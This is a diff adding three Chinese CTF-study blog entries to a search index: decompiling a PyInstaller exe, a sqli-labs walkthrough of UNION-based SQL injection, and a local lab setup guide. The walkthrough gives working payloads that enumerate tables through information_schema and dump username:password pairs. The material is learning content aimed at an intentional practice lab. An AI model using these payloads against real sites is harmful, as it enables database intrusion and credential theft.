@@ -28,4 +28,146 @@
         <tag>life</tag>
       </tags>
   </entry>
+  <entry>
+    <title>python打包的exe解包为.py</title>
+    <url>/2022/02/27/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>使用的工具：</p>
+<p>pyinstxtractor.py 解压工具（将exe文件解压为一个文件夹）</p>
+<span id="more"></span>
+
+<p>python包：uncompyle6,pyc反编译工具包</p>
+<p>winhex或010Editor等其他二进制查看修改工具</p>
+<h3 id="0x00-工具安装"><a href="#0x00-工具安装" class="headerlink" title="0x00    工具安装"></a>0x00    工具安装</h3><p><strong>uncompyle6安装：</strong></p>
+<p>方法一：</p>
+<p>pip安装</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install uncompyle6</span><br></pre></td></tr></table></figure>
+
+<p>方法二：</p>
+<p>使用pycharm安装，在pycharm的设置里依次点击  python解释器  —&gt;  ‘+’</p>
+<p><img src="/2022/02/27/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/pycharminstall.jpg"></p>
+<p><img src="/2022/02/27/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/uncom.jpg"></p>
+<p>在搜索框内填入要安装的包后点击安装即可</p>
+<p><strong>pyinstxtractor.py工具获取：</strong></p>
+<p>在网页：<a href="https://sourceforge.net/projects/pyinstallerextractor/%E4%B8%AD%E4%B8%8B%E8%BD%BD%E8%8E%B7%E5%8F%96">https://sourceforge.net/projects/pyinstallerextractor/中下载获取</a></p>
+<p><strong>winhex工具下载</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/15xVANHw6zwS89YCXcDHoEg </span><br><span class="line">提取码：7whk</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x01-exe包解压"><a href="#0x01-exe包解压" class="headerlink" title="0x01    exe包解压"></a>0x01    exe包解压</h3><p>首先使用pyinstxtractor.py进行拆包</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 pyinstxtractor.py 要拆包的文件名</span><br></pre></td></tr></table></figure>
+
+<p>执行完后会出现一个    原文件名+_extracted的文件夹,</p>
+<p><img src="/2022/02/27/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/exebreak.jpg"></p>
+<h3 id="0x02-复原头文件"><a href="#0x02-复原头文件" class="headerlink" title="0x02    复原头文件"></a>0x02    复原头文件</h3><p>在新生成的文件夹中存在exe文件同名且无后缀的文件与struct,用winhex打开两个文件</p>
+<p>将struct文件开头的16个字节<strong>（也有说是8个字节，反正将文本为pyi0的部分都恢复回去QAQ）</strong>复制粘贴到无后缀的文件头中</p>
+<p><img src="/2022/02/27/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/copypaste.jpg"></p>
+<p>修改后保存，将无后缀的文件添加上.pyc的后缀</p>
+<h3 id="0x03-逆向-pyc文件"><a href="#0x03-逆向-pyc文件" class="headerlink" title="0x03    逆向.pyc文件"></a>0x03    逆向.pyc文件</h3><p>使用uncompyle包进行逆向</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uncompyle6 文件名.pyc &gt; 文件名.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/27/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/pyc_py.jpg"></p>
+<p>拆包完成，可以打开.py文件查看代码辣！</p>
+]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+      <tags>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入二</title>
+    <url>/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/</url>
+    <content><![CDATA[<h2 id="0x00-GET报错注入"><a href="#0x00-GET报错注入" class="headerlink" title="0x00  GET报错注入"></a>0x00  GET报错注入</h2><h3 id="0000-找出合适的闭合SQL语句"><a href="#0000-找出合适的闭合SQL语句" class="headerlink" title="0000    找出合适的闭合SQL语句"></a>0000    找出合适的闭合SQL语句</h3><span id="more"></span>
+
+<h4 id="1、确定传入参数的SQL语句包裹符号"><a href="#1、确定传入参数的SQL语句包裹符号" class="headerlink" title="1、确定传入参数的SQL语句包裹符号"></a>1、确定传入参数的SQL语句包裹符号</h4><p>找出闭合的方法，以sqli_labs中的less1-less4为例子</p>
+<p>less1中的报错提示语句为</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less1error.jpg"></p>
+<p>less2中的报错语句为</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less2error.jpg"></p>
+<p>less3中的报错语句为</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less3error.jpg"></p>
+<p>less4中的报错语句为</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/less4error.jpg"></p>
+<p>​    最左边与最右边的两个单引号是报错语句引用SQL语句的部分不属于SQL语句里的一部分，单引号里面的内容分别是</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">less1:	<span class="string">&#x27;1&#x27;&#x27; LIMIT 0,1</span></span><br><span class="line"><span class="string">less2:	&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less3:	<span class="string">&#x27;1&#x27;&#x27;) LIMIT 0,1</span></span><br><span class="line"><span class="string">less4:	&quot;1\&quot; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
+
+<p>去掉输入的内容,得出大概的SQL语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">less1:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less2:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span>  id  LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less3:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span> (<span class="string">&#x27;id&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less4:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span> &quot;id&quot; LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2、得出闭合语句"><a href="#2、得出闭合语句" class="headerlink" title="2、得出闭合语句"></a>2、得出闭合语句</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">less1: id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27; --+(注释)</span></span><br><span class="line"><span class="string">less2: id = 1  --+</span></span><br><span class="line"><span class="string">less3: id = 1&#x27;</span>) <span class="comment">--+</span></span><br><span class="line">less4: id <span class="operator">=</span> <span class="number">1</span>&quot; --+</span><br></pre></td></tr></table></figure>
+
+<p>输入闭合后的参数查询能正确进行</p>
+<h3 id="0001-使用order-by-语句判断字段数"><a href="#0001-使用order-by-语句判断字段数" class="headerlink" title="0001    使用order by 语句判断字段数"></a>0001    使用order by 语句判断字段数</h3><h4 id="1、判断字段数的原因："><a href="#1、判断字段数的原因：" class="headerlink" title="1、判断字段数的原因："></a>1、<strong>判断字段数的原因：</strong></h4><p><strong>在之后的<code>union select</code>的联合查询中需要利用正确的字段数进行</strong></p>
+<h4 id="2、使用方法："><a href="#2、使用方法：" class="headerlink" title="2、使用方法："></a>2、使用方法：</h4><p>在确定的闭合语句的参数后面加上<code>order by 字段数</code>，字段数的选择可以从1开始往后一个一个试，也可以使用二分法进行爆破</p>
+<p>在less1-less4中，知道设置字段数为3都能成功查询，设置为4则不能成功查询，由此可知字段数为3</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/lessorder.jpg"></p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/lessorder4.jpg"></p>
+<h3 id="0002-使用union-select联合查询，获取表名"><a href="#0002-使用union-select联合查询，获取表名" class="headerlink" title="0002    使用union select联合查询，获取表名"></a>0002    使用union select联合查询，获取表名</h3><p>在使用查询之前要了解应该从哪里获取表名字段名等信息，这就得先了解数据库的结构，大致的结构可以看以下图片了解</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/sqlstruct.png"></p>
+<p>由此可得我们要查询<code>tables</code>表内的表名，使用<code>union select</code>之前要使原来的查询报错才会执行联合查询的语句 </p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">0</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/union123.jpg"></p>
+<p>从图中可以看出<code>union</code>查询的位置在数值2跟3 的位置，可在两个位置中选一个进行注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()  --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/selecttable.jpg"></p>
+<p>通过查询可知在该数据库下有四个表分别为<code>emails</code>、<code>referers</code>、<code>uagents</code>、<code>users</code>，现在查询<code>users</code>表中的字段名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;  --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/selectcolumn.jpg"></p>
+<p>查询到<code>users</code>表中的字段有三个，下一步查询<code>username</code>与<code>password</code>中的信息，在这之前的查询都是在汇总的 数据库<code>information_schema</code>中查询的，现在目标明确是要<code>users</code>表中的<code>usrename</code>与<code>password</code>字段里的数据，可以直接进行查询而不用到<code>information_schema</code>中查询（该数据库也不会存储字段的数据内容）</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(username,&#x27;</span>:<span class="string">&#x27;,password),3 from users  --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/selectend.jpg"></p>
+<p>less1-less4的注入就此结束，数据库中的所有信息都能获取到！</p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>WEB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入一</title>
+    <url>/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/</url>
+    <content><![CDATA[<h2 id="0x00-环境配置与工具"><a href="#0x00-环境配置与工具" class="headerlink" title="0x00    环境配置与工具"></a>0x00    环境配置与工具</h2><p>​        phpstudy2018、sqli_lab（sqli_lab的运行最好使用旧版本php，这里使用php5.x）</p>
+<span id="more"></span>
+
+<p>sqli_lab可以从github上直接下载：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/sqli-lab.png"></p>
+<p>phpstudy2018、sqli_lab都打包在一下网盘链接里，直接获取</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1UBWgP4RTyeHSwLo7-elfgg </span><br><span class="line">提取码：ycnm</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x01-环境安装配置"><a href="#0x01-环境安装配置" class="headerlink" title="0x01    环境安装配置"></a>0x01    环境安装配置</h2><p>首先解压后右键点击以管理员身份运行phpstudy2018.exe文件，选择安装路径，<strong>注意安装路径中不能包含中文与空格</strong>.</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/phpstudy.jpg"></p>
+<p>在安装路径下找到phpstudy.exe文件即可运行</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/openphp.jpg"></p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/php.jpg"></p>
+<p>在切换版本里可以选择不同的php版本，系统服务选中时会在设备开机时自动打开此系统。</p>
+<p>接下来是sqli_lab的配置，将GitHub上下载的sqli_lab压缩包解压，找到phpstudy2018的安装路径，打开  PHPTutorial-&gt;WWW ,复制整个sqli_lab文件夹到WWW文件夹下.</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/WWW.png"></p>
+<p>到phpstudy的安装路径中启动php,<strong>（注意要先启动phpstudy,再往下，不然会找不到相关文件）</strong>再打开复制过来的sqli_lab-master文件夹，找到sql-connections打开，并且打开里面的db-creds.inc文件，将$dbpass数值改为root.</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/connection.jpg"></p>
+<p>浏览器输入地址：127.0.0.1/sqli-labs-master/，<strong>注意phpstudy默认的本地端口为8080，如果有使用需要更换端口</strong>.</p>
+<p>更换端口：在php窗口中选择 其他选项菜单 -&gt; phpstudy设置 -&gt; 端口常规设置，打开后可填入可用端口后点击应用即可</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/duankou.jpg"></p>
+<p>将网址填入浏览器后出现以下页面</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/database.jpg"></p>
+<p>点击Setup/reset Database for labs，出现以下页面表示环境搭建成功</p>
+<p><img src="/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/success.jpg"></p>
+<p><strong>到此，环境就搭建成功啦，可以开始奇妙的注入之旅辣！</strong></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>WEB</tag>
+      </tags>
+  </entry>
 </search>
